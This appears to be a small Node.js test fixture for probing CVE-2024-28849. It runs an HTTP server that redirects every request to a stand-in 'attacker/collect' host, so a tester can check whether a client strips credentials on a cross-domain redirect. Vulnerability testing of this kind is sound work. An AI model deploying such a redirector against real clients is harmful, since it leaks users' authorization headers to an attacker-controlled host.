// redirector: cross-DOMAIN redirector for the RESIDUAL probe (CVE-2024-28849).
// HTTP/80 /redir -> 302 Location: http://attacker/collect  (different host => cross-domain strip fires)
import http from 'node:http';

http.createServer((req, res) => {
  res.writeHead(302, { Location: 'http://attacker/collect' });
  res.end();
}).listen(80, () => console.log('redirector http on 80 -> attacker'));
